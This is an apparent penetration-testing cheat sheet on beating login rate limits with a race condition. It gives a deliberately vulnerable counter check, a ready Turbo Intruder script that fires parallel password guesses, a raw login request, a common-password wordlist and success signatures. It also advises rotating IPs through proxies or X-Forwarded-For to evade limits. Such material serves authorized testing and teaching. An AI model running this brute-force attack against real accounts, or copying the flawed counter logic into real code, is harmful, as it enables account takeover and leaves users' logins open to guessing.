# Rate Limit Bypass (Login Brute-Force / API Quota)

## When this applies

- Endpoint enforces N attempts per session/account/IP.
- Counter is incremented AFTER the verification step. Parallel attempts read the counter before any of them update it — all pass the gate.
- Goal: try N+M passwords in one parallel volley before the counter clamps.

## Technique

Send 100 parallel login attempts with different passwords through the same gate. All 100 read the attempt counter as 0, all 100 attempt verification, the correct one returns a 302/success.

**Vulnerable Code:**
```python
if attempts[username] > 3:
    return "Too many attempts"
verify_password(username, password)
attempts[username] += 1
```

**Attack Pattern:** 100x POST /login with different passwords.

**Success Signature:** More than 3 attempts processed; one 302 redirect response.

## Steps

### Turbo Intruder script

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    passwords = wordlists.clipboard  # Copy passwords to clipboard first

    for password in passwords:
        engine.queue(target.req, password, gate='1')

    engine.openGate('1')

def handleResponse(req, interesting):
    table.add(req)
```

### Login request

```http
POST /login HTTP/2
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=target&password=%s
```

### Password wordlist

```
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
```

### Success indicator

```http
HTTP/2 302 Found
Location: /my-account
Set-Cookie: session=NEW_TOKEN
```

## Verifying success

- More than the configured limit of attempts return non-rate-limited responses.
- One response is a 302 with a fresh session cookie / `Location: /my-account`.
- The user's account is NOT locked-out after the test (counter incremented by N but still below absolute lockout).

## Common pitfalls

- Some apps lock-out the account after the first 3 failures regardless of the race — test on a throwaway account first.
- IP-based rate limits may kick in instead of session-based — rotate via proxy / X-Forwarded-For if the app trusts it.
- Some flavors of "rate limit" are actually CAPTCHA challenges after N failures — won't yield to this attack.

## Tools

- Burp Turbo Intruder (`Engine.BURP2`)
- Burp Repeater (tab groups)
- Custom Python `concurrent.futures.ThreadPoolExecutor`
